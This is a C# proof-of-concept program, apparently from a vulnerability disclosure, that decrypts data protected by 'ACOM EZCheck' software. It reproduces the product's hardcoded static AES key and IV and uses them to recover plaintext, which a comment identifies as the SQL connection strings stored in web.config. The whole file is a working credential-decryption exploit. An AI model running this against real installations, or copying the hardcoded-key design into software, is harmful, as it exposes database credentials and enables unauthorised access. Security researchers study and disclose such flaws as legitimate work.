using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;

namespace ACOMDecrypt_POC 
{
  class ACOMDecrypt 
  {
    private static CipherMode _mode = CipherMode.CBC;
    private static PaddingMode _padding = PaddingMode.PKCS7;

    //This is the static key used to encrypt sql connection in web.config
    private static char seq(int i) 
    {
      switch (i) {
      case 0:
        return 'c';
      case 1:
        return '%';
      case 2:
        return ':';
      case 3:
        return '6';
      case 4:
        return '*';
      case 5:
        return ')';
      case 6:
        return 'x';
      case 7:
        return ',';
      case 8:
        return 'd';
      case 9:
        return 'q';
      case 10:
        return '8';
      case 11:
        return '~';
      case 12:
        return 'K';
      case 13:
        return 'r';
      case 14:
        return 'M';
      case 15:
        return '0';
      case 16:
        return '&';
      default:
        return char.MinValue;
      }
    }

    public static void Main(string[] args) 
    {
      if (args.Length > 0) {
        string encryptedInput = args[0];
        string plaintext = Decrypt(encryptedInput);
        Console.WriteLine("\nPlaintext Data is: \n" + plaintext);
      } else 
      {
        Console.WriteLine("You need to pass the encrypted b64 data from ACOM EZCheck!");
      }
    }

    static string Decrypt(string encryptedText) 
    {
      byte[] iv = 
      {
        192,
        16,
        77,
        250,
        39,
        28,
        229,
        76,
        19,
        75,
        1,
        18,
        93,
        60,
        212,
        172
      };
      RijndaelManaged _rj = new RijndaelManaged();
      _rj.Mode = ACOMDecrypt._mode;
      _rj.Padding = ACOMDecrypt._padding;
      _rj.IV = iv;
      byte[] numArray = new byte[32];
      for (int i = 0; i < 10; ++i)
        numArray[i] = (byte) ACOMDecrypt.seq(i);
      _rj.Key = numArray;

      using(MemoryStream memoryStream1 = new MemoryStream(Convert.FromBase64String(encryptedText))) 
      {
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream1, _rj.CreateDecryptor(), CryptoStreamMode.Read);
        MemoryStream memoryStream2 = new MemoryStream();
        while (true) 
        {
          byte[] buffer = new byte[100];
          int count = cryptoStream.Read(buffer, 0, 100);
          if (0 != count)
            memoryStream2.Write(buffer, 0, count);
          else
            break;
        }
        cryptoStream.Close();
        memoryStream1.Close();
        byte[] array = memoryStream2.ToArray();
        memoryStream2.Close();
        return new ASCIIEncoding().GetString(array).Substring(4);
      }
    }
  }
}
